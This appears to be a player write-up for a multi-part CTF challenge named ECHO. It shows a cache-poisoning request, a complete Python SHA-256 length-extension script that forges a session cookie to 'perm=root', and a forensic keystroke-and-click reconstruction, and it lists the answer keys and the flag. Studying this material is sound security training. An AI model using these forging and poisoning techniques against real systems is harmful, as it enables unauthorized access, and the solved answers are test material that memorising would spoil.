# Challenge 5 — ECHO: The Three Systems

## Player Write-up and Intended Solve Path

**Category:** Web / Cryptography / Digital Forensics  
**Flag:** `d4rk{The_Investigation_Is_Done_The_Case_Is_Closed_ThankYou_For_Your_Effort}`

Challenge 5 contains three independent systems. Each one exposes a different weakness or evidence trail. The objective is to investigate each system, recover its authorization key, and submit all three keys through the main ECHO portal.

You do not need a supplied solver application. The steps below use a browser, its Developer Tools, and Python 3 for the cryptographic and telemetry analysis. The Python code is included in this write-up for players who want to reproduce the analysis locally; it is not a separate challenge download.

---

## Step 1 — Authenticate to the ECHO portal

Open the main ECHO portal in your browser. It begins with a 5×5 pattern-lock screen.

The required sequence comes from the numeric fragments recovered in Challenge 4. Enter the following numbers, in order, in the **KEY SEQUENCE** field:

```text
2,3,8,7,11,16,17,23,19,13
```

Click **AUTHORIZE**. You can also draw the same sequence directly on the 5×5 grid, but entering it in the text field is less error-prone.

After successful authentication, the portal displays three systems:

1. **Identity Cache**
2. **Notebook**
3. **Device Link**

Keep this portal tab open for the entire challenge. Open each system from its corresponding portal card using **OPEN SYSTEM**; it opens in a separate tab. Do not refresh or close the main portal tab after you begin submitting authorization keys. The verified progress and submitted proofs are held in browser memory and are lost on a page reload.

---

## Step 2 — Challenge 5.1: Identity Cache

**Objective:** Exploit a mismatch between the edge cache's cache-key construction and the archive application's query-parameter parsing.

### 2.1 Inspect the public archive

From the ECHO portal, open **Identity Cache**. The page is titled **Archive Intake / Public Index**.

It provides a public reference similar to:

```text
/records?slot=blue&view=index
```

It also contains the clue:

> The first label decides where the mirror files it. The final instruction decides what the clerk prints.

Open the **retired client manifest** link. It returns a small JSON document describing the accepted fields:

- `view`: `index`, `audit`, `ledger`
- `realm`: `public`, `staff`

The manifest also notes that legacy clients may repeat a field. This is important because the cache and the origin application do not interpret the query string in the same way.

### 2.2 Understand the parsing difference

The edge cache builds its cache key using only the **first** value of `slot`. It does not include `view` or `realm` in that key.

The origin application uses the **last** value of `view` and `realm` when deciding which page to render.

Consequently, a request can be stored under a cache key that looks like an ordinary public request while the origin actually returns the restricted ledger.

### 2.3 Send the cache-poisoning request

Open a new tab. Use the same hostname as the ECHO portal and construct this URL, replacing `YOUR-HOST` with the actual host (do not include a path after the hostname):

```text
https://YOUR-HOST/challenge5.1/records?slot=nv731&view=index&view=ledger&realm=staff
```

If you are testing locally, the equivalent URL is:

```text
http://localhost:8080/challenge5.1/records?slot=nv731&view=index&view=ledger&realm=staff
```

The `slot` value can be any fresh value. If you have already used `nv731`, choose a different value and use that same value in both requests below. The cache entry expires after approximately 24 seconds, so perform the second request promptly.

The parameters have these roles:

- `slot=nv731` selects the cache entry.
- The first `view=index` makes the cache key look like a public-index request.
- The second `view=ledger` is the value selected by the origin parser.
- `realm=staff` selects the restricted staff view.

### 2.4 Confirm the cache behaviour in Developer Tools

1. Press **F12** to open Developer Tools.
2. Select the **Network** tab.
3. Enable **Preserve log** if you want to keep the request visible while navigating.
4. Load the URL from Step 2.3.
5. Select the `/records` request in the Network request list.
6. Open **Headers** and inspect **Response Headers**.

The first request should show:

```text
X-Edge-Cache: MISS
X-Archive-Route: ledger
```

Now load a second URL using the **same `slot` value**, but request the public index:

```text
https://YOUR-HOST/challenge5.1/records?slot=nv731&view=index
```

For a local deployment:

```text
http://localhost:8080/challenge5.1/records?slot=nv731&view=index
```

The second response should show:

```text
X-Edge-Cache: HIT
X-Archive-Route: ledger
```

The `HIT` confirms that the edge returned the response stored by the first request. The route remains `ledger` even though the second request asks for `view=index`.

### 2.5 Recover the authorization key

The response body contains the restricted ledger, headed **Restricted Ledger — K. Sharma**. Near the bottom, find the `authorization` value:

```text
first-label-last-folio-final-clearance-echo-7319
```

Save this value exactly. It is the authorization key for **Identity Cache**.

---

## Step 3 — Challenge 5.2: Notebook

**Objective:** Use a SHA-256 length-extension attack to append a new permission claim to a signed session record.

### 3.1 Issue a temporary session

Return to the ECHO portal and open **Notebook** in its separate tab.

The page is titled **Notebook Gateway** and contains an **Operator alias** field.

1. Enter any short alias, for example `operator`.
2. Click **Issue session**.
3. The browser submits the form and redirects to `/challenge5.2/content`.
4. The page should say that the session is accepted as a reader, but that the restricted notebook requires a higher permission claim.

The session is valid; its permission is simply insufficient.

### 3.2 Inspect the session cookie

The page explains:

> The audit parser folds repeated claims in arrival order; the terminal value is authoritative.

This suggests that repeated claims are accepted and that the last value wins. The session contains a claim equivalent to `perm=reader`. The goal is to append `;perm=root` while preserving a valid signature.

Open Developer Tools (**F12**) and select the **Application** tab.

1. Expand **Storage** if necessary.
2. Open **Cookies**.
3. Select the current challenge hostname.
4. Find the cookie named `session`.
5. Copy its **Value**. Copy only the value, not `session=` and not the other cookie attributes.

The cookie is marked `HttpOnly`, so page JavaScript cannot read it through `document.cookie`. It is still visible in the browser's Developer Tools under Application → Cookies. You can also inspect the `Set-Cookie` response header for the POST request to `/challenge5.2/login` in the Network tab.

The cookie value has this structure:

```text
BASE64URL_SESSION_DATA~SHA256_HEX_DIGEST
```

The data portion is URL-safe Base64 without padding. The digest is a hexadecimal SHA-256 value.

### 3.3 Understand the cryptographic weakness

The server signs the session using a construction equivalent to:

```text
SHA256(secret || domain || data)
```

The fixed domain is:

```text
ECHO/NOTEBOOK/V2\x00
```

This is a secret-prefix use of plain SHA-256, not HMAC. SHA-256's Merkle–Damgård construction allows a length-extension attack: given the original digest and message, an attacker can calculate the digest for an extended message without knowing the secret, provided they can guess the length of the secret.

The server generates a secret whose length is between 24 and 48 bytes, inclusive. We can test each possible length.

The session data contains claims separated by semicolons. Its permission claim initially has the value `reader`. The parser processes claims from left to right and overwrites an earlier value when the same claim appears again. Appending `;perm=root` therefore makes `root` the effective permission, provided the extended record has a valid digest.

### 3.4 Create and run a local Python script

No solver script is distributed with the challenge. The following is a self-contained Python 3 implementation you can create locally to perform the length-extension attack.

Create a file named `forge_notebook.py` and paste the code below into it. It uses only Python's standard library; no third-party packages are required.

```python
import argparse
import base64
import http.client
import re
import struct
import sys
import urllib.parse
import urllib.request

K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
]
MASK = 0xFFFFFFFF


def rotr(x, n):
    return ((x >> n) | (x << (32 - n))) & MASK


def compress(state, block):
    w = list(struct.unpack(">16L", block)) + [0] * 48
    for i in range(16, 64):
        s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >> 3)
        s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >> 10)
        w[i] = (w[i - 16] + s0 + w[i - 7] + s1) & MASK
    a, b, c, d, e, f, g, h = state
    for i in range(64):
        S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)
        ch = (e & f) ^ (~e & g)
        t1 = (h + S1 + ch + K[i] + w[i]) & MASK
        S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)
        maj = (a & b) ^ (a & c) ^ (b & c)
        t2 = (S0 + maj) & MASK
        h, g, f, e = g, f, e, (d + t1) & MASK
        d, c, b, a = c, b, a, (t1 + t2) & MASK
    return [(x + y) & MASK for x, y in zip(state, [a, b, c, d, e, f, g, h])]


def sha256_padding(total_len_bytes):
    ml = total_len_bytes * 8
    pad = b"\x80"
    pad += b"\x00" * ((56 - (total_len_bytes + 1) % 64) % 64)
    pad += struct.pack(">Q", ml)
    return pad


def length_extend(orig_sig_hex, orig_data, secret_len, append):
    """Given SHA256(secret||orig_data) = orig_sig_hex, and a GUESSED
    secret_len, compute SHA256(secret || orig_data || glue || append)
    without ever knowing `secret`. Returns (new_data, new_sig_hex)."""
    state = list(struct.unpack(">8L", bytes.fromhex(orig_sig_hex)))
    total_before = secret_len + len(b'ECHO/NOTEBOOK/V2\x00') + len(orig_data)
    glue = sha256_padding(total_before)
    total_after = total_before + len(glue) + len(append)
    tail = append + sha256_padding(total_after)
    for i in range(0, len(tail), 64):
        state = compress(state, tail[i : i + 64])
    new_sig = b"".join(struct.pack(">L", x) for x in state).hex()
    new_data = orig_data + glue + append
    return new_data, new_sig


def b64_nopad(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


class NoRedirect(urllib.request.HTTPErrorProcessor):
    def http_response(self, request, response):
        return response  # don't let urllib chase the 303 to /login on a failed forge
    https_response = http_response


_opener = urllib.request.build_opener(NoRedirect)


def fetch_content(base_url, cookie_value):
    req = urllib.request.Request(base_url.rstrip("/") + "/content", headers={"Cookie": f"session={cookie_value}"})
    with _opener.open(req, timeout=5) as r:
        return r.status, r.read()


COOKIE_RE = re.compile(r"([A-Za-z0-9_-]+=*~[0-9a-fA-F]{64})")


def clean_cookie(raw: str) -> str:
    """Forgiving extractor: works whether the user pasted just the value,
    a full 'Set-Cookie: session=...; Path=/...' header, or 'session=...'
    with trailing attributes. Pulls out the <base64>.<64-hex> pattern."""
    raw = raw.strip()
    m = COOKIE_RE.search(raw)
    if not m:
        print("[-] couldn't find a <base64>.<64 hex chars> pattern in that value.")
        print(f"    you gave: {raw!r}")
        print("    paste ONLY the session cookie's value (no 'Set-Cookie:', no 'session=',")
        print("    no trailing '; Path=/; HttpOnly...').")
        sys.exit(1)
    return m.group(1)


def login(base_url: str, username: str) -> str:
    """Logs in exactly like a browser submitting the form, and returns the
    raw session cookie value from the Set-Cookie response header."""
    url = base_url.rstrip("/") + "/login"
    body = urllib.parse.urlencode({"username": username}).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    try:
        resp = _opener.open(req, timeout=5)
    except Exception as e:
        print(f"[-] could not reach {url}: {e}")
        print("    is the server actually running and is this the right host/port?")
        print("    (check: docker compose ps   and   docker compose logs)")
        sys.exit(1)
    set_cookie = resp.headers.get("Set-Cookie")
    if not set_cookie:
        print(f"[-] logged in (status {resp.status}) but got no Set-Cookie header back.")
        sys.exit(1)
    return clean_cookie(set_cookie)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("base_url", help="e.g. http://localhost:4002")
    ap.add_argument("--cookie", help="a captured session cookie value; if omitted, this script logs in itself")
    ap.add_argument("--username", default="forger", help="username to use when logging in automatically")
    args = ap.parse_args()

    if args.cookie:
        cookie = clean_cookie(args.cookie)
        print(f"[*] using provided cookie")
    else:
        print(f"[*] no --cookie given: logging in as {args.username!r} at {args.base_url}/login ...")
        cookie = login(args.base_url, args.username)
        print(f"[*] got a fresh session cookie from the server")

    b64_part, sig_hex = cookie.rsplit("~", 1)
    try:
        orig_data = base64.urlsafe_b64decode(b64_part + "=" * (-len(b64_part) % 4))
        bytes.fromhex(sig_hex)  # validate early, fail with a clear message instead of a traceback later
    except Exception as e:
        print(f"[-] that cookie didn't decode as expected: {e}")
        print(f"    base64 part: {b64_part!r}")
        print(f"    sig part   : {sig_hex!r}")
        sys.exit(1)

    print(f"[*] captured data: {orig_data!r}")
    print(f"[*] captured sig : {sig_hex}")

    # Sanity check: does this cookie even verify as-is? If not, it's stale
    # (e.g. the server restarted and rotated its secret since this cookie
    # was issued) and NO forgery built on it can ever work.
    try:
        status, _ = fetch_content(args.base_url, cookie)
        print(f"[*] this cookie as-is -> status {status} ({'accepted, but not yet admin' if status == 403 else 'unexpected'})")
    except Exception as e:
        print(f"[-] could not reach {args.base_url}: {e}")
        sys.exit(1)

    append = b";perm=root"  # the privilege field, forced to admin, appended last so it wins
    for secret_len in range(24, 49):  # bounded, unknown secret length -- no oracle, just try them all
        new_data, new_sig = length_extend(sig_hex, orig_data, secret_len, append)
        forged_cookie = b64_nopad(new_data) + "~" + new_sig
        try:
            status, body = fetch_content(args.base_url, forged_cookie)
        except Exception as e:
            print(f"[-] request failed for secret_len={secret_len}: {e}")
            continue
        mark = "OK " if status == 200 else "   "
        print(f"[{mark}] secret_len={secret_len:>2}  status={status}")
        if status == 200:
            print(f"\n[+] forged with secret_len={secret_len}")
            print(f"[+] forged cookie: {forged_cookie}")
            print("\n--- server response ---")
            print(body.decode("utf-8", "replace"))
            return
    print("[-] no secret length in range (24-48) worked.")
    print("    if the sanity-check status above was NOT 403, the cookie itself is stale")
    print("    (likely the server restarted since it was issued) -- log in again and retry.")


if __name__ == "__main__":
    main()
```

Run it from a terminal:

```bash
python3 forge_notebook.py https://YOUR-HOST/challenge5.2
```

For a local deployment:

```bash
python3 forge_notebook.py http://localhost:8080/challenge5.2
```

The script tests all possible secret lengths from 24 through 48 bytes. For each candidate, it:

1. Decodes the original session data and digest.
2. Computes the SHA-256 glue padding for the guessed original message length.
3. Appends `;perm=root` to the padded message.
4. Continues the SHA-256 compression from the original digest to calculate the forged digest.
5. Sends the forged session cookie to `/challenge5.2/content`.

When the correct secret length is found, the server returns HTTP 200 and displays the restricted notebook. A successful response contains the heading **Private notebook — Gold Traders**.

### 3.5 Recover the authorization key

In the restricted notebook, locate the `authorization` value:

```text
gold-traders-session-claims-are-not-the-same-as-identity-4826
```

Save it exactly. This is the authorization key for **Notebook**.

---

## Step 4 — Challenge 5.3: Device Link

**Objective:** Reconstruct a credential by correlating process identity, keyboard events, screen snapshots, and clock-calibration records.

### 4.1 Open the evidence console and download the files

Return to the ECHO portal and open **Device Link** in its separate tab.

The page is titled **Device Evidence Console**. It provides seven evidence files:

| File | Purpose |
|---|---|
| `capture.json` | Collector event export |
| `screen_trace.csv` | Display snapshots and screen coordinates |
| `clock_sync.csv` | Device-to-screen clock calibration |
| `process_map.csv` | Process and window inventory |
| `control_map.csv` | UI control inventory |
| `keymap.csv` | HID usage-to-character mapping |
| `field-notes.txt` | Evidence interpretation notes |

Download all seven files into one local folder. The `capture.json` link may open in the browser as raw JSON; use **Save As** to save it as `capture.json`.

Open `field-notes.txt` first. It establishes the important interpretation rules:

- `rx` is collector arrival time, not source event order.
- `seq` is the monotonic source sequence number for this capture.
- Only clock-calibration rows marked `LOCKED` should be used.
- A screen snapshot is valid only during its recorded time interval.
- HID usage values must be translated using the supplied keymap, with modifiers considered separately.

### 4.2 Identify the correct process and input control

Open `process_map.csv`. It maps the relevant application as follows:

| PID | Process | Window | Owner |
|---:|---|---|---|
| 4242 | `NovaVaultClient.exe` | `W-19` | NovaVault |
| 5010 | `browser.exe` | `W-04` | browser |
| 6112 | `notes.exe` | `W-33` | local notes |

The target application is therefore PID `4242`, window `W-19`.

Next, open `control_map.csv`. The relevant control is:

- Control hash: `C91A`
- Type: `credential`
- Label: `account recovery field`

The other controls belong to a search field and a saved-password prompt. Do not mix their events into the reconstruction.

### 4.3 Determine the keyboard-input interval

Open `capture.json` in a text editor or inspect it using Python. It contains 114 events.

Find the focus and blur events for control `C91A`, PID `4242`, and window `W-19`:

- Sequence `51`: focus on `C91A`
- Sequence `108`: blur from `C91A`

The relevant keyboard events are those between these sequence numbers that satisfy all of the following:

- `kind` is `key`;
- `pid` is `4242`;
- `window` is `W-19`.

Use `seq` to preserve the source order. Do **not** sort by `rx`; collector arrival order is deliberately different from source order.

The relevant key-event sequence numbers are:

```text
52, 53, 56, 58, 59, 60, 61, 62, 63, 64, 66
```

Use the `scan` value from each event and look it up in `keymap.csv`. All these events have `mods=0`, so use the `normal` column.

The scan codes translate as follows:

```text
6, 15, 18, 6, 14, 45, 22, 14, 8, 26, 45
c, l, o, c, k, -, s, k, e, w, -
```

The keyboard-entered fragment is:

```text
clock-skew-
```

### 4.4 Calibrate the device clock to the screen clock

The remaining characters were entered through an on-screen interface. The click events contain device-clock timestamps, while `screen_trace.csv` records intervals using the display recorder's clock. These clocks are not identical.

Open `clock_sync.csv`. Use only the four rows whose `quality` is `LOCKED`. Exclude the `HOLDOVER` row.

Fit a straight line to the locked samples, with `device_tick` as x and `screen_tick` as y. The resulting relationship is approximately:

```text
screen_tick = 1.00036578 × device_tick + 731.52450
```

For every relevant click event, calculate its screen time using this equation. Then find the row in `screen_trace.csv` whose `screen_start` and `screen_end` contain that converted time.

### 4.5 Match each click to the correct character

Filter `capture.json` for events satisfying:

- `kind` is `click`;
- `pid` is `4242`;
- `window` is `W-19`.

Process these click events in ascending `seq` order. For each click:

1. Convert its `tick` to `screen_tick` using the calibration equation.
2. Select the `screen_trace.csv` snapshot whose interval contains that time.
3. Parse that row's `grid_json` field.
4. Find the entry whose `x` and `y` match the click event's coordinates.
5. Record that entry's `ch` character.

The screen snapshots are not listed in chronological order in the CSV. Use `screen_start` and `screen_end` to identify the correct interval rather than relying on the file's row order.

The click events reconstruct these characters in sequence order:

| Snapshot interval (chronological) | Characters recovered |
|---|---|
| F1 | `i s - p` |
| F2 | `a r t` |
| F3 | `- o f` |
| F4 | `- t h e` |
| F5 | `- e v` |
| F6 | `i d e n` |
| F7 | `c e` |
| F8 | `- 7` |
| F9 | `3 1` |

Here, F1 through F9 are labels assigned after sorting the screen snapshots by their time intervals; they are not fields present in the evidence.

Concatenating the recovered characters in click-event sequence order gives:

```text
is-part-of-the-evidence-731
```

### 4.6 Reproduce the reconstruction with Python

The following optional script automates the same analysis using only the seven downloaded evidence files and Python's standard library. Save it as `reconstruct.py` in the folder containing the evidence files.

```python
import csv
import json
from pathlib import Path

folder = Path(__file__).resolve().parent

with open(folder / "capture.json", encoding="utf-8") as f:
    events = json.load(f)["events"]

with open(folder / "process_map.csv", newline="", encoding="utf-8") as f:
    processes = list(csv.DictReader(f))

with open(folder / "control_map.csv", newline="", encoding="utf-8") as f:
    controls = list(csv.DictReader(f))

with open(folder / "keymap.csv", newline="", encoding="utf-8") as f:
    keymap = {int(r["hid_usage"]): r["normal"] for r in csv.DictReader(f)}

with open(folder / "clock_sync.csv", newline="", encoding="utf-8") as f:
    locked = [r for r in csv.DictReader(f) if r["quality"] == "LOCKED"]

with open(folder / "screen_trace.csv", newline="", encoding="utf-8") as f:
    screens = list(csv.DictReader(f))

# Confirm the process/control mapping before using the event stream.
assert any(r["pid"] == "4242" and r["window_id"] == "W-19"
           and r["process"] == "NovaVaultClient.exe" for r in processes)
assert any(r["control_hash"] == "C91A" and r["control_type"] == "credential"
           for r in controls)

# Locate focus and blur for the target input control.
focus = next(e["seq"] for e in events if e["kind"] == "focus"
             and e["pid"] == 4242 and e["window"] == "W-19"
             and e.get("control") == "C91A")
blur = next(e["seq"] for e in events if e["kind"] == "blur"
            and e["pid"] == 4242 and e["window"] == "W-19"
            and e.get("control") == "C91A")

keyboard_events = sorted(
    (e for e in events if focus < e["seq"] < blur
     and e["kind"] == "key" and e["pid"] == 4242
     and e["window"] == "W-19"),
    key=lambda e: e["seq"]
)
keyboard_fragment = "".join(keymap[e["scan"]] for e in keyboard_events)

# Ordinary least-squares fit using LOCKED clock samples only.
xs = [float(r["device_tick"]) for r in locked]
ys = [float(r["screen_tick"]) for r in locked]
mx = sum(xs) / len(xs)
my = sum(ys) / len(ys)
slope = sum((x - mx) * (y - my) for x, y in zip(xs, ys)) / sum((x - mx) ** 2 for x in xs)
intercept = my - slope * mx

# Parse each display snapshot once.
for row in screens:
    row["start"] = float(row["screen_start"])
    row["end"] = float(row["screen_end"])
    row["grid"] = json.loads(row["grid_json"])

clicks = sorted(
    (e for e in events if e["kind"] == "click"
     and e["pid"] == 4242 and e["window"] == "W-19"),
    key=lambda e: e["seq"]
)

screen_chars = []
for event in clicks:
    screen_time = slope * event["tick"] + intercept
    candidates = [r for r in screens
                  if r["window_id"] == "W-19"
                  and r["start"] <= screen_time <= r["end"]]
    if len(candidates) != 1:
        raise RuntimeError(f"Expected one screen snapshot for seq {event['seq']}; got {len(candidates)}")
    grid = candidates[0]["grid"]
    match = next((cell["ch"] for cell in grid
                  if cell["x"] == event["x"] and cell["y"] == event["y"]), None)
    if match is None:
        raise RuntimeError(f"No grid cell for click sequence {event['seq']}")
    screen_chars.append(match)

screen_fragment = "".join(screen_chars)
credential = keyboard_fragment + screen_fragment

print("Keyboard fragment:", keyboard_fragment)
print("Screen fragment:  ", screen_fragment)
print("Recovered credential:", credential)
```

Run it with:

```bash
python3 reconstruct.py
```

The expected output is:

```text
Keyboard fragment: clock-skew-
Screen fragment:   is-part-of-the-evidence-731
Recovered credential: clock-skew-is-part-of-the-evidence-731
```

### 4.7 Verify the recovered credential

Return to the **Device Evidence Console** browser tab. Enter the reconstructed credential into the **Recovered credential** field and click **Verify**.

The console should display the **Recovered endpoint note**. Its `authorization` value is:

```text
clock-skew-is-part-of-the-evidence-731
```

Save this value exactly. It is the authorization key for **Device Link**.

---

## Step 5 — Reconnect all three systems

Return to the original ECHO portal tab. Open each system's card and enter its recovered authorization key in the **AUTHORIZATION KEY** field.

| System | Authorization key |
|---|---|
| Identity Cache | `first-label-last-folio-final-clearance-echo-7319` |
| Notebook | `gold-traders-session-claims-are-not-the-same-as-identity-4826` |
| Device Link | `clock-skew-is-part-of-the-evidence-731` |

Click **AUTHORIZE** for each system. A successful submission displays **SYSTEM CONNECTED**. Repeat until all three systems are connected.

Once all three proofs have been accepted, the three system nodes converge into the central ECHO node. Allow the animation to finish; the portal then requests the final flag from the server and displays it.

**Do not refresh or close the main portal tab before the flag appears.** The challenge proofs are kept in client-side memory and are not restored after a reload. If the page is refreshed, authenticate again and resubmit the three keys.

## Final Flag

```text
d4rk{The_Investigation_Is_Done_The_Case_Is_Closed_ThankYou_For_Your_Effort}
```

## Key Takeaways

- Differences in query-parameter parsing can create cache-key confusion and cache-poisoning vulnerabilities.
- A secret-prefix SHA-256 construction is vulnerable to length extension and should not be used as a substitute for HMAC.
- A valid signature does not necessarily establish the identity behind a session; authorization claims must be designed and verified carefully.
- Digital-forensics reconstruction requires correlating process identity, UI controls, input events, display state, and clock calibration.
- Collector arrival order is not necessarily source event order, and timestamps from different clocks cannot be compared without calibration.


I know this challenge use so many internal scripts but that's the motive of this, in real life, there is no easy way, that any website especially the website of hacker can be exploit easily. You need to write custom codes to exploit them
